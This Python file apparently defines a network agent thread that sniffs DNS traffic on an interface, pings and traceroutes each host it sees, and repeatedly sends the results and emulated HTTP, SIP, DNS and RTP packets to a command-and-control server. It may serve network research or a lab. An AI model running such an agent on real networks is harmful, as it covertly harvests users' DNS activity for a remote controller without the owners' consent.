import subprocess
import threading
import os
import time
import socket

from sniffing import DNS_Sniffer
from sockets import Sopc, Definitions
from network import Ping, Traceroute, public_ip, UDP_
from pemu import Packet 

class Worker(threading.Thread):
    def __init__(self,sleep_time = 60, interface = 'eth0', hostname: str = socket.gethostname()):
        try:
            super(Worker, self).__init__()
            self.whoami = hostname
            self.sniffer = DNS_Sniffer(interface=interface)
            self.wait_time = sleep_time
        except Exception as e:
            pass

    def run(self):
        try:
            # Run the DNS sniffer
            self.sniffer.start()
            # Start ping, traceroute, and pemu packets
            while True:
                self.ping()
                self.pemu()
                time.sleep(self.wait_time)

        except Exception as e:
            print(e)


    def ping(self):
        for host in self.sniffer.dns_dict:
            ping_response = Ping(host,count=25)
            data = ping_response.to_dict()
            data['type_'] = Definitions.Messages.PING_RESPONSE
            data['from_'] = self.whoami
            Packet.send(Definitions.C2_SERVER_, data)

            ping_request = Ping(host, count=25,request=True)
            data = ping_request.to_dict()
            data['type_'] = Definitions.Messages.PING_REQUEST
            data['from_'] = self.whoami
            Packet.send(Definitions.C2_SERVER_, data)
        
            traceroute = Traceroute(host)
            data = traceroute.to_dict()
            data['type_'] = Definitions.Messages.TRACEROUTE
            data['from_'] = self.whoami
            Packet.send(Definitions.C2_SERVER_, data)


    def pemu(self):
        Packet.send_http_get(Definitions.C2_SERVER_, 8080)
        Packet.send_sip_invite(Definitions.C2_SERVER_)
        Packet.send_dns_request(Definitions.C2_SERVER_)
        Packet.send_rtp_packet(Definitions.C2_SERVER_)






